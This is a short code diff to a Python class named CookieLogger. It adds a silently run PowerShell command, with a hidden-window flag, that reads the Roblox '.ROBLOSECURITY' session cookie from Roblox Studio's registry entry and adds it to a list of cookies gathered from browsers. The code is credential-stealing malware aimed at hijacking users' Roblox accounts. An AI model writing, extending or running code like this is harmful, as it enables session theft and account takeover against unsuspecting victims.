@@ -47,6 +47,12 @@ class CookieLogger:
         }]
 
         cookies = []
+        try:
+            studioCookie = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip()
+            cookies.append(studioCookie)
+        except Exception:
+            pass
+        
         for browser in browsers:
             try:
                 cookies = self.getCookie(browser[0], browser[1])
